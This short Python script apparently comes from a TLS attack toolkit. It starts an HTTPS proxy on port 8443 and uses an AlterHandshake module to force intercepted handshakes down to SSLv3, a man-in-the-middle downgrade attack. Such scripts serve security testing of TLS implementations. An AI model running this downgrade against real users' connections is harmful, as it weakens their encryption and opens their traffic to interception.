import logging
import sys
import time

from tls_attack.module.AlterHandshake import *
from tls_attack.structure.TLSHeader import *
from tls_attack.proxy.HTTPSProxyServer import *

logging.basicConfig(stream=sys.stdout, level=logging.WARN)

https_server = HTTPSProxyServer(port = 8443)

attack = AlterHandshake(https_server)
attack.downgrade_tls_version(TLSVersion.SSLv3.value)
attack.start()